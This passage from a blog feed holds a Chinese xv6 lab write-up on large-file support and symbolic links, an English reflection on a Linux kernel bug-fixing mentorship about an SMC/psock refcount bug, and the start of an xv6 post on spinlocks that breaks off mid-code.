class="line"><span class="comment">// kernel/fs.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the disk block address of the nth block in inode ip.</span></span><br><span class="line"><span class="comment">// If there is no such block, bmap allocates one.</span></span><br><span class="line"><span class="type">static</span> uint</span><br><span class="line"><span class="title function_">bmap</span><span class="params">(<span class="keyword">struct</span> inode *ip, uint bn)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint addr, *a;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDIRECT)&#123;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  bn -= NDIRECT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">    <span class="comment">// Load indirect block, allocating if necessary.</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT+bn/NBPIND]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[NDIRECT+bn/NBPIND] = addr = balloc(ip-&gt;dev);</span><br><span class="line"></span><br><span class="line">    bn %= NBPIND;</span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">      a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    brelse(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  bn -= NINDIRECT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDINDIRECT)&#123;</span><br><span class="line">    <span class="comment">// Load doubly indirect block, allocating if necessary.</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT+NINDE+bn/NBPDIND]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[NDIRECT+NINDE+bn/NBPDIND] = addr = balloc(ip-&gt;dev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load indirect block, allocating if necessary.</span></span><br><span class="line">    bn %= NBPDIND;</span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn/NBPIND]) == <span class="number">0</span>)&#123;</span><br><span class="line">      a[bn/NBPIND] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    brelse(bp);</span><br><span class="line"></span><br><span class="line">    bn %= NBPIND;</span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">      a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    brelse(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  panic(<span class="string">&quot;bmap: out of range&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后则是重构<strong>itrunc()</strong>，其依次遍历<strong>inode</strong>的<strong>direct block</strong>、<strong>indirect block</strong>和<strong>doubly indirect block</strong>，将这些<strong>block</strong>和这些block包含的<strong>data block</strong>通过<strong>bfree()</strong>释放掉即可，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/fs.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Truncate inode (discard contents).</span></span><br><span class="line"><span class="comment">// Caller must hold ip-&gt;lock.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">itrunc</span><span class="params">(<span class="keyword">struct</span> inode *ip)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i, j, k;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp1</span>, *<span class="title">bp2</span>;</span></span><br><span class="line">  uint *a1, *a2;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free direct data blocks</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NDIRECT; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(ip-&gt;addrs[i])&#123;</span><br><span class="line">      bfree(ip-&gt;dev, ip-&gt;addrs[i]);</span><br><span class="line">      ip-&gt;addrs[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free indirect data blocks</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NINDE; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(ip-&gt;addrs[NDIRECT+i]) &#123;</span><br><span class="line">      bp1 = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT+i]);</span><br><span class="line">      a1 = (uint*)bp1-&gt;data;</span><br><span class="line">      <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; NBPIND; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a1[j])</span><br><span class="line">          bfree(ip-&gt;dev, a1[j]);</span><br><span class="line">      &#125;</span><br><span class="line">      brelse(bp1);</span><br><span class="line">      bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT+i]);</span><br><span class="line">      ip-&gt;addrs[NDIRECT+i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free doubly indirect data blocks</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NDINDE; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(ip-&gt;addrs[NDIRECT+NINDE+i]) &#123;</span><br><span class="line">      bp1 = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT+NINDE+i]);</span><br><span class="line">      a1 = (uint*)bp1-&gt;data;</span><br><span class="line">      <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; NINDEPDIND; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a1[j]) &#123;</span><br><span class="line">          bp2 = bread(ip-&gt;dev, a1[j]);</span><br><span class="line">          a2 = (uint*)bp2-&gt;data;</span><br><span class="line">          <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; NBPIND; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a2[k])</span><br><span class="line">              bfree(ip-&gt;dev, a2[k]);</span><br><span class="line">          &#125;</span><br><span class="line">          brelse(bp2);</span><br><span class="line">          bfree(ip-&gt;dev, a1[j]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      brelse(bp1);</span><br><span class="line">      bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT+NINDE+i]);</span><br><span class="line">      ip-&gt;addrs[NDIRECT+NINDE+i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ip-&gt;size = <span class="number">0</span>;</span><br><span class="line">  iupdate(ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;bigfile&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="bigfile实验结果.png" alt="bigfile实验结果"></p><h2 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h2><h3 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h3><blockquote><p>You will implement the <strong>symlink(char <em>target, char </em>path)</strong> system call, which creates a new symbolic link at path that refers to file named by target. For further information, see the man page symlink. To test, add symlinktest to the Makefile and run it. Your solution is complete when the tests produce the following output (including usertests succeeding).<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ symlinktest</span><br><span class="line">Start: <span class="built_in">test</span> symlinks</span><br><span class="line"><span class="built_in">test</span> symlinks: ok</span><br><span class="line">Start: <span class="built_in">test</span> concurrent symlinks</span><br><span class="line"><span class="built_in">test</span> concurrent symlinks: ok</span><br><span class="line">$ usertests</span><br><span class="line">...</span><br><span class="line">ALL TESTS PASSED</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>由于文件系统在解析<strong>符号链接</strong>文件时，会采用和其他文件类型完全不同的方式，因此可以添加新的文件类型即可</p><p>而为了完成<strong>符号链接</strong>功能，则重构系统调用中涉及文件系统的部分，添加<strong>符号链接</strong>类型的功能支持即可</p><h3 id="实现-8"><a href="#实现-8" class="headerlink" title="实现"></a>实现</h3><p>首先，在<strong>xv6</strong>中添加<strong>symlink</strong>系统调用，即添加相关的系统调用号和系统调用声明，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// System call numbers</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_symlink 22</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_symlink</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">  ...</span><br><span class="line">[SYS_symlink] sys_symlink,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// user/user.h</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">symlink</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *target, <span class="type">const</span> <span class="type">char</span> *linkpath)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// user/usys.pl</span></span><br><span class="line">entry(<span class="string">&quot;symlink&quot;</span>);</span><br></pre></td></tr></table></figure></p><p>其次则是实现系统调用<strong>symlink()</strong>，即完成必要的检查后，创建相关的<strong>符号链接</strong>类型的文件即可。其中根据要求，<strong>符号链接</strong>类型的文件内容是传入的路径字符串即可，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysfile.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a symbol file pointing to the given path</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_symlink</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> target[MAXPATH], linkpath[MAXPATH];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argstr(<span class="number">0</span>, target, MAXPATH) &lt; <span class="number">0</span> || argstr(<span class="number">1</span>, linkpath, MAXPATH) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  begin_op();</span><br><span class="line">  <span class="keyword">if</span>((ip = create(linkpath, T_SYMLINK, <span class="number">0</span>, <span class="number">0</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// write the target to the inode</span></span><br><span class="line">  <span class="keyword">if</span>(writei(ip, <span class="number">0</span>, (uint64)target, <span class="number">0</span>, MAXPATH) != MAXPATH)</span><br><span class="line">    panic(<span class="string">&quot;symlink: writei&quot;</span>);</span><br><span class="line"></span><br><span class="line">  iunlockput(ip);</span><br><span class="line">  end_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面则是添加<strong>符号链接</strong>的操作。实际上，<strong>符号链接</strong>的作用，就是路径替换，即解析该<strong>符号链接</strong>时，相当于解析其替换的文件。在具体一些，在<strong>xv6</strong>中，即解析其替换的文件的<strong>inode</strong>。因此，可以通过更改<strong>open</strong>系统调用，返回其实际指向的文件的<strong>inode</strong>即可，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysfile.c</span></span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_open</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> path[MAXPATH];</span><br><span class="line">  <span class="type">int</span> fd, omode, iterate;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((n = argstr(<span class="number">0</span>, path, MAXPATH)) &lt; <span class="number">0</span> || argint(<span class="number">1</span>, &amp;omode) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  begin_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(omode &amp; O_CREATE)&#123;</span><br><span class="line">    ip = create(path, T_FILE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ip == <span class="number">0</span>)&#123;</span><br><span class="line">      end_op();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((ip = namei(path)) == <span class="number">0</span>)&#123;</span><br><span class="line">      end_op();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ilock(ip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deal with symlink file</span></span><br><span class="line">    <span class="keyword">if</span>((omode &amp; O_NOFOLLOW) == <span class="number">0</span>) &#123;</span><br><span class="line">      iterate = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>(ip-&gt;type == T_SYMLINK) &#123;</span><br><span class="line">        <span class="keyword">if</span>((readi(ip, <span class="number">0</span>, (uint64)path, <span class="number">0</span>, MAXPATH)) != MAXPATH || iterate++ &gt;= MAXITER) &#123;</span><br><span class="line">          iunlockput(ip);</span><br><span class="line">          end_op();</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        iunlockput(ip);</span><br><span class="line">        <span class="keyword">if</span>((ip = namei(path)) == <span class="number">0</span>) &#123;</span><br><span class="line">          end_op();</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ilock(ip);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ip-&gt;type == T_DIR &amp;&amp; omode != O_RDONLY)&#123;</span><br><span class="line">      iunlockput(ip);</span><br><span class="line">      end_op();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  iunlock(ip);</span><br><span class="line">  end_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;symlink&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="symlink实验结果.png" alt="symlink实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinuxFoundation mentorship</title>
      <link href="/2022/08/26/LinuxFoundation-mentorship/"/>
      <url>/2022/08/26/LinuxFoundation-mentorship/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h1><p>My name is <strong>Jiawei Hawkins</strong>, and I am in my second year for my master school life. I am really appreciated for being selected to participate in the <strong>Linux kernel Bug Fixing Summer 2022</strong>. This mentorship is really a good oppotunity to join the linux kernel community, I also have a much deeper understanding on linux kernel by analysing linux kernel bug.</p><h1 id="what-I-Learned"><a href="#what-I-Learned" class="headerlink" title="what I Learned"></a>what I Learned</h1><p>To be honest, I am really confused at the beginning of this mentorship. I only have little knowledge about linux kernel, I even don’t know how to find the linux kernel bug, how to analyse the kernel bug, how to submit the patch.</p><p>Yet with the help of the <strong>Shuah</strong>, this mentorship, and the welcoming people in linux kernel mailing list, I was able to learn these basic concepts gradually.</p><p>At the beginning, this mentorship provides me with some tasks to finish. These well-designed tasks are really a excellent guideline, to help newbies build the basic environment to develop linux kernel, and dirty our hands to practise some basic scripts and commands in linux kernel.</p><p>What’s more, there are also useful materials in the mentorship, which give me a more detailed tutorial on how to analyse bug and what should do to submit a patch to community.</p><p>And the <strong>Shuah</strong>‘s office hours also helps me a lot. These discussions between <strong>Shuah</strong> and other mentees really broaden my horizons on different linux subsystem.</p><h1 id="what-I-fixed"><a href="#what-I-fixed" class="headerlink" title="what I fixed"></a>what I fixed</h1><p>The most challenging bug I fixed is ‘<strong>WARNING: refcount bug in sk_psock_get (2)</strong>‘, which is reported by the syzkaller. Because it is my first bug, so I meet lots of trouble when analysing and patching it.</p><p>This is a bug in linux net subsystem. Yet the problem is that I am not very familiar with the net subsystem.</p><p>But luckily, with the help of the bisect’s output and gdb, One can know which code results this bug by setting the breakpoint at the function in bisect. Then we find that it is <strong>smc_switch_to_fallback()</strong> causing the bug.</p><p>To be more specific, during <strong>SMC</strong> fallback process in connect syscall, kernel will replaces TCP with <strong>SMC</strong>. In order to forward wakeup <strong>SMC</strong> socket waitqueue after fallback, kernel will sets <strong>clcsk-&gt;sk_user_data</strong> to origin <strong>SMC</strong> socket in <strong>smc_fback_replace_callbacks()</strong>.</p><p>Later, in <strong>shutdown</strong> syscall, kernel will calls <strong>sk_psock_get()</strong>, which treats the <strong>clcsk-&gt;sk_user_data</strong> as <strong>psock</strong> type, triggering the refcnt warning.</p><p>So, the root cause is that <strong>SMC</strong> and <strong>psock</strong>, both will use <strong>sk_user_data</strong> field. So they will mismatch this field easily.</p><p>So we can solve this bug by using another bit(defined as <strong>SK_USER_DATA_PSOCK</strong>) in <strong>PTRMASK</strong>, to mark whether <strong>sk_user_data</strong> points to a <strong>psock</strong> object or not.</p><h1 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h1><p>The past few months leave me a really unforgettable impression! I really gain a lot in the past months from this mentorship.</p><p>I have a much deeper understanding on linux kernel during analysing bug, especially for net and file subsystem in linux kernel. And the review and comments from the mailing list also give me how others think about the same problem, which really helps me understand linux kernel!</p><p>Thanks for <strong>Shuah</strong> and your mentorship. With the help of your office hours and materials, I can gradually contribue to linux kernel!</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-八</title>
      <link href="/2022/07/13/xv6-%E5%85%AB/"/>
      <url>/2022/07/13/xv6-%E5%85%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客研究<strong>xv6</strong>的<strong>锁</strong>机制</p><h1 id="lock原因"><a href="#lock原因" class="headerlink" title="lock原因"></a>lock原因</h1><p>lock的一个最重要的应用场景——解决<strong>条件竞争</strong><br><strong>条件竞争</strong>，即多个CPU<strong>并行</strong>的访问同一块内存，并且至少有一个执行<strong>写</strong>操作。当<strong>条件竞争</strong>出现时，往往会发生<strong>写入丢失</strong>或<strong>读取未完全更新的数据</strong>事件，从而引发更严重的bug。</p><p>而<strong>lock</strong>可以很好的避免<strong>条件竞争</strong>。<strong>lock</strong>可以确保<strong>互斥性</strong>，即确保同一时间只有一个进程访问<strong>临界区</strong>(可能被并行执行的部分)资源，从而根本上避免了不完整更新引发的bug。</p><h1 id="lock机制"><a href="#lock机制" class="headerlink" title="lock机制"></a>lock机制</h1><p>一般来说，内核会提供两类<strong>lock</strong>——<strong>spinlock</strong>(自旋锁)和<strong>sleeplock</strong>(信号量)<br><strong>spinlock</strong>一般用于短时的互斥(关闭中断响应)；而<strong>sleeplock</strong>往往用于长时的互斥</p><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p><strong>xv6</strong>的自旋锁依赖于C标准库的<strong>__sync_lock_test_and_set</strong>函数，其在<strong>riscv</strong>底层通过<strong>amoswap</strong>(Atomic Memory Operations swap)实现。其通过互斥的设置和访问共享变量，从而根据获取的旧值来判断当前自旋锁状态，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Acquire the lock.</span></span><br><span class="line"><span class="comment">// Loops (spins) until the lock is acquired.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">acquire</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  push_off(); <span class="comment">// disable interrupts to avoid deadlock.</span></span><br><span class="line">  <span class="keyword">if</span>(holding(lk))</span><br><span class="line">    panic(<span class="string">&quot;acquire&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// On RISC-V, sync_lock_test_and_set turns into an atomic swap:</span></span><br><span class="line">  <span class="comment">//   a5 = 1</span></span><br><span class="line">  <span class="comment">//   s1 = &amp;lk-&gt;locked</span></span><br><span class="line">  <span class="comment">//   amoswap.w.aq a5, a5, (s1)</span></span><br><span class="line">  <span class="keyword">while</span>(__sync_lock_test_and_set(&amp;lk-&gt;locked, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Release the lock.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">release</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!holding(lk))</span><br><span class="line">    panic(<span class="string">&quot;release&quot;</span>);</span><br><span class="line"></span><br><span class="line">  lk-&gt;cpu = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tell the C compiler and the CPU to not move loads or stores</span></span><br><span class="line">  <span class="comment">// past this point, to ensure that all the stores in the critical</span></span><br><span class="line">  <span class="comment">// section are visible to other CPUs before the lock is released,</span></span><br><span class="line">  <span class="comment">// and that loads in the critical section occur strictly before</span></span><br><span class="line">  <span class="comment">// the lock is released.</span></span><br><span class="line">  <span class="comment">// On RISC-V, this emits a fence instruction.</span></span><br><span class="line">  __sync_synchronize();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Release the lock, equivalent to lk-&gt;locked = 0.</span></span><br><span class="line">  <span class="comment">// This code doesn&#x27;t use a C assignment, since the C standard</span></span><br><span class="line">  <span class="comment">// implies that an assignment might be implemented with</span></span><br><span class="line">  <span class="comment">// multiple store instructions.</span></span><br><span class="line">  <span class="comment">// On RISC-V, sync_lock_release turns into an atomic swap:</span></span><br><span class="line">  <span class="comment">//   